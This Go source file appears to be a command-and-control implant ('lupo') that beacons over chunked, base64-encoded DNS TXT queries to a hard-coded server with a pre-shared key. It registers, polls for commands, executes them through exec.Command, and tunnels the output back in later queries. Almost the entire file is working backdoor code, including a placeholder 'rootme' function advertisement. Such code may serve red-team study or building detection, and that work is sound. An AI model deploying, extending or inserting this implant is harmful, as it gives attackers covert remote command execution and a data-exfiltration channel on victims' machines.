package main

import (
	"encoding/base64"
	"fmt"
	"log"
	"strings"
	"time"
	"encoding/json"
	"strconv"
	//"io/ioutil"
	//"strconv"
	"runtime"
	"os/exec"
	"github.com/miekg/dns"
)


// Configuration
type lupoImplant struct {
	updateInterval int
	protocol       string
	dns_domain     string
	rhost          string
	rport          int
	id             int
	uuid           string
	psk            string
	data           string
}

var implant *lupoImplant

func main() {


	implant = &lupoImplant{
		updateInterval: 1,
		protocol:       "DNS",
		dns_domain:     "example.com.",
		rhost:          "192.168.3.227",
		rport:          1337,
		id:             -1,
		uuid:           "",
		psk:            "wolfpack",
		data:           "",
	}

	for {
		ExecLoop(implant)
		time.Sleep(time.Duration(implant.updateInterval) * time.Second)
	}
}

func ExecLoop(implant *lupoImplant) {
	if implant.id == -1 {
		// Registration message
		regMsg := map[string]interface{}{
			"psk":      implant.psk,
			"register": true,
			"update":   implant.updateInterval,
			"arch":     getArchitecture(),
			"functions": buildCustomFunctions(),
		}

		jsonMsg, err := json.Marshal(regMsg)
		if err != nil {
			log.Printf("Failed to marshal registration: %v", err)
			return
		}

		resp, err := sendDNSMessage(implant, string(jsonMsg))
		if err != nil {
			log.Printf("Failed to send registration: %v", err)
			return
		}

		// Parse registration response (server returns plain JSON in TXT)
		if resp != "" {
			serverResp, err := parseServerJSON(resp)
			if err != nil {
				log.Printf("Failed to parse response: %v", err)
				log.Printf("Raw response was: %s", resp)
				return
			}

			implant.id = int(serverResp["sessionID"].(float64))
			implant.uuid = serverResp["UUID"].(string)
		}
		return
	}

	// Regular check-in message
	checkInMsg := map[string]interface{}{
		"psk":       implant.psk,
		"sessionID": implant.id,
		"UUID":      implant.uuid,
	}

	// Add any pending command output (send raw string; server will display or forward)
	if implant.data != "" {
		checkInMsg["data"] = implant.data
		implant.data = "" // Clear after sending
	}

	// Include update interval and arch to mirror HTTP implant behavior
	checkInMsg["update"] = implant.updateInterval
	checkInMsg["arch"] = getArchitecture()

	jsonMsg, err := json.Marshal(checkInMsg)
	if err != nil {
		log.Printf("Failed to marshal check-in: %v", err)
		return
	}

	resp, err := sendDNSMessage(implant, string(jsonMsg))
	if err != nil {
		log.Printf("Failed to send check-in: %v", err)
		return
	}

	// Handle server command
	if resp != "" {
		cmdResp, err := parseServerJSON(resp)
		if err != nil {
			log.Printf("Failed to parse command: %v", err)
			log.Printf("Raw response was: %s", resp)
			return
		}

		if cmd, ok := cmdResp["cmd"].(string); ok && cmd != "" {
			// Execute command and store result for next check-in
			output := executeCommand(cmd) // Implement this based on your needs
			implant.data = output
		}
	}
}

// parseServerJSON attempts to parse either a raw JSON object or a
// JSON-encoded string that contains the object (double-encoded).
func parseServerJSON(resp string) (map[string]interface{}, error) {
	var obj map[string]interface{}
	if err := json.Unmarshal([]byte(resp), &obj); err == nil {
		return obj, nil
	}

	// Maybe it's a quoted JSON string like "{\"key\":...}"
	var inner string
	if err := json.Unmarshal([]byte(resp), &inner); err == nil {
		if err2 := json.Unmarshal([]byte(inner), &obj); err2 == nil {
			return obj, nil
		} else {
			return nil, err2
		}
	}

	// As a last resort, try to unquote escaped JSON that lacks outer quotes,
	// e.g. {\"UUID\":...} -> {"UUID":...}
	if unq, err := strconv.Unquote("\"" + resp + "\""); err == nil {
		if err3 := json.Unmarshal([]byte(unq), &obj); err3 == nil {
			return obj, nil
		}
	}

	return nil, fmt.Errorf("could not parse server response as JSON")
}

func executeCommand(cmd string) string {
	// Placeholder for command execution logic
	// In a real implementation, this would execute the command and capture output
	data, err := exec.Command(cmd).Output()
	if err != nil {
		return "Command execution failed: " + err.Error()
	}
	return string(data)
}

func sendDNSMessage(implant *lupoImplant, message string) (string, error) {
	// Encode the whole JSON message using RawURLEncoding (no padding), then chunk it
	encodedMsg := base64.RawURLEncoding.EncodeToString([]byte(message))

	const maxChunkSize = 40
	chunks := make([]string, 0)
	for i := 0; i < len(encodedMsg); i += maxChunkSize {
		end := i + maxChunkSize
		if end > len(encodedMsg) {
			end = len(encodedMsg)
		}
		chunks = append(chunks, encodedMsg[i:end])
	}

	connectionString := fmt.Sprintf("%s:%d", implant.rhost, implant.rport)
	totalChunks := len(chunks)
	serverResp := ""

	for i, chunk := range chunks {
		// Use hyphen-separated first label: <sessionID>-<chunkIndex>-<totalChunks>-<chunkPayload>
		sessionID := implant.id
		if sessionID == -1 {
			sessionID = 0
		}
		label := fmt.Sprintf("%d-%d-%d-%s", sessionID, i, totalChunks, chunk)
		fqdn := fmt.Sprintf("%s.%s", label, implant.dns_domain)

		msg := new(dns.Msg)
		msg.SetQuestion(fqdn, dns.TypeTXT)
		msg.RecursionDesired = false

		c := new(dns.Client)
		c.Timeout = 5 * time.Second
		resp, _, err := c.Exchange(msg, connectionString)
		if err != nil {
			return "", fmt.Errorf("DNS query failed: %v", err)
		}

		// Process server response: server returns plain JSON in TXT for non-ack responses
		if resp != nil && len(resp.Answer) > 0 {
			if txt, ok := resp.Answer[0].(*dns.TXT); ok {
				serverResp = strings.Join(txt.Txt, "")
				if serverResp != "chunk received" && serverResp != "ack" {
					// Expect plain JSON
					break
				}
			}
		}

		time.Sleep(100 * time.Millisecond)
	}

	return serverResp, nil
}

// Add this new helper function
func sanitizeDNSLabel(s string) string {
    // Remove any characters that could cause DNS issues
    s = strings.Map(func(r rune) rune {
        if (r >= 'a' && r <= 'z') ||
           (r >= 'A' && r <= 'Z') ||
           (r >= '0' && r <= '9') ||
           r == '-' {
            return r
        }
        return '-'
    }, s)

    // Ensure label isn't too long
    if len(s) > 63 {
        return s[:63]
    }

    // Remove consecutive hyphens
    for strings.Contains(s, "--") {
        s = strings.ReplaceAll(s, "--", "-")
    }

    // Ensure label doesn't start or end with hyphen
    s = strings.Trim(s, "-")

    if s == "" {
        return "x" // Ensure we never return empty label
    }

    return s
}

func encodeBase64(input string) string {
	return base64.RawURLEncoding.EncodeToString([]byte(input))
}


func getArchitecture() string {

	arch := runtime.GOOS + "/" + runtime.GOARCH

	return arch

}

func buildCustomFunctions() string {
	custom_functions := []string{
		"\"rootme\":\"gives instant root every time\"",
		"\"other_func\":\"does funky things\""}

	customFunctionStr := "{"
	for index, custom_fun := range custom_functions {

		if index == len(custom_functions)-1 {
			customFunctionStr += custom_fun
		} else {
			customFunctionStr += custom_fun + ","
		}

	}
	customFunctionStr += "}"

	return customFunctionStr
}


func chunkString(data string, maxPayload int) []string {
	chunks := []string{}
	totalChunks := (len(data) + maxPayload - 1) / maxPayload

	for i := 0; i < totalChunks; i++ {
		start := i * maxPayload
		end := start + maxPayload
		if end > len(data) {
			end = len(data)
		}
		chunkData := data[start:end]
		prefix := fmt.Sprintf("%d-%d-", i, totalChunks)
		chunks = append(chunks, prefix+chunkData)
	}

	return chunks
}

